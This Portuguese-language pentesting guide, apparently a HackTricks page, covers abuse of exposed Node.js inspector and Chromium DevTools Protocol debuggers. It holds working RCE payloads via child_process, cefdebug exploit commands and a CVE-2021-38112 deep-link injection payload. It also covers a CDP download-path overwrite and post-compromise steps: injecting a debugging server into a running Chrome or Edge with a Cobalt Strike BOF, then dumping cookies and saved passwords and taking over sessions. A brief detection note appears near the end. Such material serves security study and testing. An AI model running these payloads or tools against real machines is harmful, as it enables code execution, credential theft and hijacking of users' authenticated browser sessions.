# Abuso do depurador Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Exemplos práticos históricos incluem o walkthrough Multimaster e o ataque ao depurador do Visual Studio Code CVE-2019-1414; use-os como contexto específico de versões, em vez de presumir que todos os alvos atuais de Electron ou Chromium exponham as mesmas primitivas.<sup>[[1]](#references)[[3]](#references)</sup>

## Informações básicas

[Da documentação](https://nodejs.org/learn/getting-started/debugging): Quando iniciado com a opção `--inspect`, um processo Node.js escuta por um cliente de depuração. Por **padrão**, ele escuta no host e na porta **`127.0.0.1:9229`**. Cada processo também recebe um **UUID** **único**.<sup>[[4]](#references)</sup>

Os clientes do inspector precisam saber e especificar o endereço do host, a porta e o UUID para se conectar. Uma URL completa será semelhante a `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Como o **depurador tem acesso total ao ambiente de execução do Node.js**, um agente malicioso capaz de se conectar a essa porta pode conseguir executar código arbitrário em nome do processo Node.js (**possível escalonamento de privilégios**).<sup>[[4]](#references)</sup>

Há várias maneiras de iniciar um inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Ao iniciar um processo inspecionado, algo parecido com isto será exibido:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Processos baseados em **CEF** (**Chromium Embedded Framework**) podem expor um debugger com `--remote-debugging-port=9222`. Isso expõe o navegador por meio do [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), em vez de um inspector do Node.js, então payloads baseados em `process` do Node.js não são diretamente aplicáveis por padrão.<sup>[[2]](#references)[[5]](#references)</sup>

Quando você inicia um navegador em modo de depuração, algo assim será exibido:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerando e controlando um endpoint CDP

Os endpoints HTTP de descoberta distinguem o WebSocket do **navegador** dos WebSockets de **target** individuais (aba, worker, extensão etc.). Consulte `/json/version` para obter o endpoint do navegador e `/json/list` para listar os targets; os valores `webSocketDebuggerUrl` retornados podem então ser controlados diretamente com mensagens semelhantes a JSON-RPC do CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Por exemplo, conecte-se com `websocat "$BROWSER_WS"` e envie `{"id":1,"method":"Target.getTargets"}` ou `{"id":2,"method":"Storage.getCookies"}`. Em um alvo de página (`websocat "$PAGE_WS"`), `Runtime.evaluate` executa no renderer e `Page.captureScreenshot` retorna uma captura de tela codificada em base64. `document.cookie` não pode revelar cookies `HttpOnly`, enquanto `Storage.getCookies` consulta o armazenamento de cookies do navegador.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Navegadores, WebSockets e política de mesma origem <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Sites abertos em um navegador da web podem fazer solicitações WebSocket e HTTP de acordo com o modelo de segurança do navegador. Uma **conexão HTTP inicial** é necessária para **obter um ID de sessão de debugger exclusivo**. A **política de mesma origem** **impede** que sites façam **essa conexão HTTP**. Para aumentar a segurança contra [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** o Node.js verifica se os **cabeçalhos 'Host'** da conexão especificam um **endereço IP** ou exatamente **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Essas **medidas de segurança impedem explorar o inspector** para executar código **apenas enviando uma solicitação HTTP** (o que poderia ser feito explorando uma vulnerabilidade SSRF).<sup>[[4]](#references)</sup>

### Iniciando o inspector em processos em execução

Você pode enviar o **sinal SIGUSR1** para um processo nodejs em execução para fazê-lo **iniciar o inspector** na porta padrão. No entanto, observe que você precisa ter privilégios suficientes. Portanto, isso pode conceder **acesso privilegiado a informações dentro do processo**, mas não uma escalada direta de privilégios.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Isso é útil em containers porque **encerrar o processo e iniciar um novo** com `--inspect` **não é uma opção**, pois o **container** será **encerrado** junto com o processo.<sup>[[6]](#references)</sup>

### Conectar ao inspector/debugger

Para se conectar a um navegador baseado em **Chromium**, é possível acessar as URLs `chrome://inspect` ou `edge://inspect` para Chrome ou Edge, respectivamente. Ao clicar no botão Configure, deve-se garantir que o **host e a porta de destino** estejam listados corretamente. A imagem mostra um exemplo de Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Após uma URL para acessar o debugger aparecerá. Por exemplo, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Conectar ao inspector/debugger: Para se conectar a um navegador baseado em Chromium,...](<../../images/image (674).png>)

Usando a **linha de comando**, você pode se conectar a um debugger/inspector com:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

A ferramenta [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) permite **encontrar inspetores** em execução localmente e **injetar código** neles.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Note que **exploits de RCE do NodeJS não funcionarão** se você estiver conectado a um navegador via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (é necessário verificar a API para encontrar coisas interessantes para fazer com ela).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE no Depurador/Inspector do NodeJS

> [!TIP]
> Se você chegou aqui procurando como obter [**RCE a partir de um XSS no Electron, consulte esta página.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Algumas formas comuns de obter **RCE** quando é possível **conectar** a um **inspector** do Node são usar algo como (parece que isso **não funcionará em uma conexão com o Chrome DevTools Protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads do Chrome DevTools Protocol

Você pode consultar a API aqui: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Nesta seção, vou apenas listar coisas interessantes que encontrei e que as pessoas usaram para explorar esse protocolo.

### Restrição do perfil padrão no Chrome 136+

A partir do **Chrome 136**, o Chrome ignora `--remote-debugging-port` e `--remote-debugging-pipe` quando são usados com o **diretório de dados padrão do Chrome**. A opção deve ser combinada com um `--user-data-dir` não padrão, cuja chave de criptografia separada e estado isolado do navegador impedem que a técnica simples baseada em flags exponha o perfil autenticado normal do usuário. Não se deve presumir que essa restrição específica do Chrome se aplique a versões mais antigas do Chrome, ao Chrome for Testing, a aplicativos Electron/CEF ou a outros derivados do Chromium sem verificação.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Portanto, ver um processo atual do Chrome iniciado apenas com `--remote-debugging-port` **não** prova que o CDP foi ativado. Confirme o listener e `/json/version`, e determine qual perfil realmente o utiliza.<sup>[[14]](#references)</sup>

### Injeção de parâmetros via deep links

Em [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), a Rhino Security descobriu que um aplicativo baseado em CEF **registrou uma URI personalizada** no sistema (workspaces://index.html), que recebia a URI completa e então **iniciava o aplicativo baseado em CEF** com uma configuração parcialmente construída a partir dessa URI.<sup>[[8]](#references)</sup>

Descobriu-se que os parâmetros da URI eram decodificados como URL e usados para iniciar o aplicativo básico baseado em CEF, permitindo que um usuário **injetasse** a flag **`--gpu-launcher`** na **linha de comando** e executasse comandos arbitrários.<sup>[[8]](#references)</sup>

Assim, um payload como:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Executará um calc.exe.<sup>[[8]](#references)</sup>

### Sobrescrever arquivos

Altere a pasta onde os **arquivos baixados serão salvos** e baixe um arquivo para **sobrescrever** o **código-fonte** frequentemente usado pelo aplicativo com seu **código malicioso**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### RCE e exfiltração via WebDriver

A STAR Labs demonstrou que serviços WebDriver/CDP expostos podem permitir leitura arbitrária de arquivos e RCE; em algumas configurações, DNS rebinding pode completar a cadeia de exploração.<sup>[[9]](#references)</sup>

O serviço WebDriver do ChromeDriver é distinto do Chrome DevTools/CDP. A capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) seleciona o executável do navegador iniciado para uma nova sessão. Se um usuário sem privilégios puder acessar um serviço ChromeDriver executado como root e enviar uma sessão com um caminho de executável controlado por ele, essa inicialização poderá cruzar o limite de privilégios do serviço. Uma resposta vazia de `/sessions` não determina se novas sessões podem ser criadas. Antes de concluir que esse caminho pode ser usado, inspecione o proprietário do processo, a acessibilidade real do listener, a autorização de sessões, o acesso ao executável e as medidas de isolamento; o nome do processo ou a porta usual, por si só, não são suficientes. As [orientações de segurança do Google](https://developer.chrome.com/docs/chromedriver/security-considerations) recomendam executar o ChromeDriver com uma conta sem privilégios. A enumeração passiva não deve criar uma sessão WebDriver.

Para outros casos históricos de automação de navegador e segurança do Chromium, consulte a análise do Counter WebDriver e os problemas 773, 1742 e 1944 do Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Habilitando CDP dentro de um processo Chromium em execução

A restrição de perfil padrão do Chrome bloqueia apenas o caminho de ativação pela linha de comando. Com acesso suficiente ao mesmo usuário para manipular o processo do navegador, o [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) original e o [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) do Cobalt Strike invocam `content::DevToolsAgentHost::StartRemoteDebuggingServer`, não exportado pelo Chromium, dentro do `chrome.exe` ou `msedge.exe` já em execução. Portanto, o endpoint pertence ao perfil real e mantém suas abas, extensões, cookies e estado de autenticação.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Para processos x64 comuns do Chrome/Edge, o BOF localiza a janela do navegador e o `chrome.dll`/`msedge.dll` carregado, busca assinaturas com máscaras no PE remoto, aloca stubs e um bloco de contexto, substitui temporariamente o procedimento da janela e despacha a chamada final na **thread de UI** do navegador. As entradas de runtime relevantes são `StartRemoteDebuggingServer`, o `operator new` do Chromium, `TCPServerSocketFactory::CreateForHttpServer` e a vtable da factory. A execução é interrompida se qualquer assinatura obrigatória não tiver uma correspondência única.<sup>[[15]](#references)[[16]](#references)</sup>

O BOF aceita um modo de navegador e uma porta opcional. Em seguida, seu script auxiliar pode verificar o endpoint e coletar cookies; `chrome-iso` é um caminho separado para contornar o limite de isolamento de processos do Windows do Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

O caminho `chrome-iso` usa apenas handles limitados a consultas para o processo isolado. Ele identifica o `chrome.dll` instalado cuja imagem PE tem o mesmo tamanho que o processo em execução, resolve símbolos dessa imagem local e usa o dispatch `WindowImpl` do Chromium, além de `WM_COPYDATA` síncrono e um hook existente do User32 na imagem, para alcançar a thread da interface.<sup>[[16]](#references)</sup>

> [!WARNING]
> Esta é uma técnica de **manipulação do processo do navegador após o comprometimento**, não um bypass de rede não autenticado. Ela depende da versão do build, pois os símbolos C++ relevantes não são exportados e podem mudar após atualizações do navegador.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Atualizar assinaturas após atualizações do navegador

Use a versão exata do `chrome.dll` ou `msedge.dll` instalada no alvo e o PDB correspondente. O `symchk.exe` do Windows SDK baixa os símbolos; em seguida, os scripts do repositório localizam `StartRemoteDebuggingServer`, derivam os argumentos do alocador/factory de sockets ou validam todas as assinaturas incorporadas no BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Um resultado sem correspondências ou com várias correspondências não deve ser substituído por um endereço arbitrário. Se um padrão conhecido de `operator new` ou `CreateForHttpServer` tiver mudado demais para servir de base a uma nova máscara, use `pe_signature_finder.py` com o PDB para inspecionar esse símbolo e derivar uma sequência de bytes exclusiva no módulo de destino.<sup>[[16]](#references)[[18]](#references)</sup>

#### Extração por navegador autenticado com CDP Toolkit

Esta técnica não descriptografa offline o App-Bound Encryption (ABE) nem remove a vinculação ao dispositivo. Em vez disso, trata o navegador legítimo como um **oráculo de descriptografia e proxy de interação autenticado**: `Storage.getCookies` solicita os cookies armazenados ao navegador em execução, enquanto os fluxos de navegação e screencast mantêm as requisições, o armazenamento, a autenticação empresarial e o comportamento vinculado ao dispositivo dentro do navegador existente da vítima.<sup>[[17]](#references)[[18]](#references)</sup>

Depois de encaminhar o listener CDP de loopback pelo pivot do operador, o [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) pode enumerar e coletar artefatos comuns.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` e `tabs screenshot` são, em sua maioria, wrappers de `/json/version`, da lista de alvos, de `Storage.getCookies` e de `Page.captureScreenshot`. Já o histórico, os favoritos, as extensões e os metadados de senhas exigem um alvo temporário de WebUI `chrome://`/`edge://`: o toolkit aguarda a renderização da interface, inspeciona seu modelo ou DOM, coleta o resultado e fecha o alvo.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` vai além: abre a origem real do login salvo, foca um campo de credencial, seleciona a sugestão nativa de preenchimento automático usando eventos de entrada do CDP e lê os valores preenchidos. A origem/porta/caminho deve corresponder de perto ao realm da senha salva; o modo visível é a opção padrão mais confiável, pois o pop-up de sugestões é uma interface nativa do navegador.<sup>[[17]](#references)[[18]](#references)</sup>

Para interação ao vivo, `browser-takeover screencast` transmite quadros e envia entradas a um alvo real (inclusive nos modos em segundo plano ou fora da tela). Já `browser-takeover proxy` aceita HTTP e HTTPS `CONNECT` localmente e faz solicitações upstream por meio de alvos ocultos do Chrome, recorrendo a abas em segundo plano quando alvos ocultos não estão disponíveis; isso preserva o contexto de rede/autenticação da vítima, mas é menos fiel para aplicações complexas do lado do cliente, pois o navegador do operador renderiza o conteúdo retornado.<sup>[[17]](#references)[[18]](#references)</sup>

Para detecção, não dependa apenas da telemetria de linha de comando `--remote-debugging-*`: correlacione também handles incomuns e operações de memória em processos do navegador (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, criação de threads), injeção de DLL e sockets de escuta loopback inesperados pertencentes ao Chrome/Edge.<sup>[[15]](#references)</sup>

### Pós-exploração

Em um ambiente real e **após comprometer** um PC de usuário que utiliza um navegador baseado em Chromium, uma técnica histórica consistia em reiniciar o navegador com o debugging habilitado e encaminhar a porta loopback. Isso pode expor o estado de navegação da vítima em produtos/builds que ainda aceitam o perfil selecionado, mas o Chrome 136+ não permite isso com seu diretório de dados padrão.<sup>[[7]](#references)[[14]](#references)</sup>

O comando original de reinicialização é mantido abaixo para alvos antigos ou específicos de versão. O segundo comando é o formato compatível com o Chrome atual, mas cria um perfil isolado em vez de reabrir o estado autenticado normal da vítima.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Para técnicas específicas de macOS envolvendo reinicialização do Chromium, extensões e CDP, consulte [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Ferramenta de inspeção e exploração do debugger do CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution no Visual Studio Code via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Guia de debugging do Node.js - Primeiros passos](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Abusando do recurso de debugging do Chrome para observar e controlar remotamente sessões de navegação](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Remote Code Execution no AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Está falando comigo? - RCE via WebDriver, DNS Rebinding e CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - De bot a RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (rastreador de bugs do Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Alterações nas opções de debugging remoto para melhorar a segurança - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injetando CDP em um navegador Edge em execução: uma análise aprofundada da instrumentação do navegador em tempo de execução](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - O retorno do Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
